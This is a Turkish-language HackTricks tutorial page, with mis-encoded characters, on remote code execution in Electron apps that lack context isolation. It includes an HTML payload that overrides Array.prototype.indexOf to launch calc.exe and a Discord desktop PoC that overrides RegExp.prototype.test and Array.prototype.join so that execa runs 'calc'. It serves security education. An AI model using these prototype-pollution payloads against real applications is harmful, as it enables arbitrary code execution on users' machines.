# Electron contextIsolation RCE via preload code

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan ileri seviyeye taÅŸÄ±yÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Ã–rnek 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30) adresindeki Ã¶rnektir.

Bu kod, http(s) baÄŸlantÄ±larÄ±nÄ± varsayÄ±lan tarayÄ±cÄ±yla aÃ§ar:

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

`file:///C:/Windows/systemd32/calc.exe` gibi bir ÅŸey, bir hesap makinesi Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir, ancak `SAFE_PROTOCOLS.indexOf` bunu engeller.

Bu nedenle, bir saldÄ±rgan XSS veya keyfi sayfa gezintisi aracÄ±lÄ±ÄŸÄ±yla bu JS kodunu enjekte edebilir:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
`SAFE_PROTOCOLS.indexOf` Ã§aÄŸrÄ±sÄ± her zaman 1337 dÃ¶ndÃ¼receÄŸi iÃ§in saldÄ±rgan korumayÄ± atlayabilir ve hesap makinesini Ã§alÄ±ÅŸtÄ±rabilir. Son saldÄ±rÄ±:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
DiÄŸer izin isteyen bir iÅŸlem olmadan programlarÄ± yÃ¼rÃ¼tmek iÃ§in baÅŸka yollar iÃ§in orijinal slaytlara bakÄ±n.

GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re, kod yÃ¼klemek ve yÃ¼rÃ¼tmek iÃ§in `file://127.0.0.1/electron/rce.jar` gibi bir ÅŸeye eriÅŸmek baÅŸka bir yÃ¶ntemdir.

## Ã–rnek 2: Discord UygulamasÄ± RCE

Ã–rnek [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1) adresinden alÄ±nmÄ±ÅŸtÄ±r.

Preload betiklerini kontrol ettiÄŸimde, Discord'un web sayfasÄ±na `DiscordNative.nativeModules.requireModule('MODULE-NAME')` aracÄ±lÄ±ÄŸÄ±yla Ã§aÄŸrÄ±labilen bazÄ± izin verilen modÃ¼lleri aÃ§Ä±ÄŸa Ã§Ä±karan bir iÅŸlevi ortaya koyduÄŸunu buldum.\
Burada, doÄŸrudan RCE iÃ§in kullanÄ±labilecek modÃ¼lleri kullanamadÄ±m, Ã¶rneÄŸin _child\_process_ modÃ¼lÃ¼, ancak JavaScript'in yerleÅŸik yÃ¶ntemlerini geÃ§ersiz kÄ±larak ve aÃ§Ä±ÄŸa Ã§Ä±kan modÃ¼lÃ¼n yÃ¼rÃ¼tmesine mÃ¼dahale ederek RCE'nin elde edilebileceÄŸi bir kod buldum.

AÅŸaÄŸÄ±daki PoC'dir. "_discord\_utils_" adlÄ± modÃ¼lden tanÄ±mlanan "_getGPUDriverVersions_" iÅŸlevini, devTools'dan `RegExp.prototype.test` ve `Array.prototype.join` yÃ¶ntemlerini geÃ§ersiz kÄ±larak Ã§aÄŸÄ±rdÄ±ÄŸÄ±mda **calc** uygulamasÄ±nÄ±n **aÃ§Ä±ldÄ±ÄŸÄ±nÄ±** doÄŸrulayabildim.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` fonksiyonu, aÅŸaÄŸÄ±daki gibi "_execa_" kÃ¼tÃ¼phanesini kullanarak programÄ± Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±r:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
_genellikle_ _execa_, `nvidiaSmiPath` deÄŸiÅŸkeninde belirtilen "_nvidia-smi.exe_"'yi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±r, ancak Ã¼zerine yazÄ±lan `RegExp.prototype.test` ve `Array.prototype.join` nedeniyle **argÃ¼man, \_execa**'nÄ±n iÃ§ iÅŸleme**sinde "_calc_" ile deÄŸiÅŸtirilir.

Ã–zellikle, argÃ¼man aÅŸaÄŸÄ±daki iki bÃ¶lÃ¼mÃ¼ deÄŸiÅŸtirilerek deÄŸiÅŸtirilir.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
